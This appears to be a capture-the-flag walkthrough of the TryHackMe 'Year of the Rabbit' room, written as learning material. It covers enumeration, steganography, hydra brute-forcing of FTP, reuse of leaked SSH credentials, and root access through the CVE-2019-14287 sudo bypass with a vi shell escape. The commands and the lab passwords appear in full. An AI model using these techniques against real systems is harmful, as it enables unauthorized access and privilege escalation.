# Year of the Rabbit

<img src="yotr.jpeg" alt="rabbit" width=200/>

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2

22/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=
|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh

80/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### ffuf

```
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 7853, Words: 2862, Lines: 190]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

Upon website enumeration we visit `/assets` dir there is a `rickrolled.mp4` video (lol)

and a css file...that we might as well check and oh...

```
/* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

People hide things in stylesheets now? wow! who would know?

they recommand to disable javascript? we fire up `burpsuite` instead

we see that before redirecting us to a rickroll (that I dodged like a pro )

it does a request with a nice parameter

```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.10.27.204
```

We just visit the `/WExYY2Cv-qU` dir to get a picture named `Hot_Babe.png`

<img src="Hot_Babe.png" alt="hot-babe" width=200/>

I sense steganography

```
└──╼ $exif Hot_Babe.png
Données corrompues
Les données fournies ne respectent pas les spécifications.
ExifLoader: Les données fournies ne semblent pas contenir de données EXIF.

└──╼ $steghide --info Hot_Babe.png
steghide: le format du fichier "Hot_Babe.png" n'est pas support�.

└──╼ $binwalk -e Hot_Babe.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced
54            0x36            Zlib compressed data, best compression
```

Yeah indeed...I try `strings` and yes it was that

```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
...
```

I copy the list in a `dict.txt` file

Now we can either try each password manually like cavemen...or use hydra

I trust ya'll on this to make the best choice

I do it the peasant way

```
└──╼ $hydra -l ftpuser -P dict.txt ftp://10.10.27.204
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-03 12:34:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.27.204:21/
[21][ftp] host: 10.10.27.204   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-03 12:34:29

```

Now we can ftp as `ftpuser : 5iez1wGXKfPKQ`

We get `Eli`'s creds...but in `brainf*ck`

Let me decode that for yo real quick

```
User: eli

Password: DSpDiM1wAEwid
```

We get access

```
└──╼ $ssh eli@10.10.154.151
The authenticity of host '10.10.154.151 (10.10.154.151)' can't be established.
ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.154.151' (ECDSA) to the list of known hosts.
eli@10.10.154.151's password:


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$
```

nice ambiance...we are at the right place

```
eli@year-of-the-rabbit:/home/gwendoline$ ls
user.txt
eli@year-of-the-rabbit:/home/gwendoline$ cat user.txt
cat: user.txt: Permission denied
```

I don't know what I expected

```
eli@year-of-the-rabbit:/home/gwendoline$ find / -name "*s3cr3t*" 2> /dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
eli@year-of-the-rabbit:/home/gwendoline$
```

Let's meddle with people's affairs

```
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

they say its for her only but let us all have read access

LMAO 60 characters...

now we got access as `gwendoline : MniVCQVhQHUNI`

```
gwendoline@year-of-the-rabbit:~$ cat user.txt
THM{hmm_what_s_up_doc_?}
```

## Privileges escalation

The classics

```
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

```

hmm...`!root`

hmm...`vi`

I say `cve-2019-14287`

I remember it from a nice tryhackme room dedicated to it so check it [here](https://tryhackme.com/room/sudovulnsbypass)

`sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`

Now that `vi` is open, use the classic `:!/bin/bash`

(you can visit gfobins for that one)

```
root@year-of-the-rabbit:/home/gwendoline# id
uid=0(root) gid=0(root) groups=0(root)

root@year-of-the-rabbit:/root# cat root.txt
THM{duck_season_rabbit_season}

```

And its done!
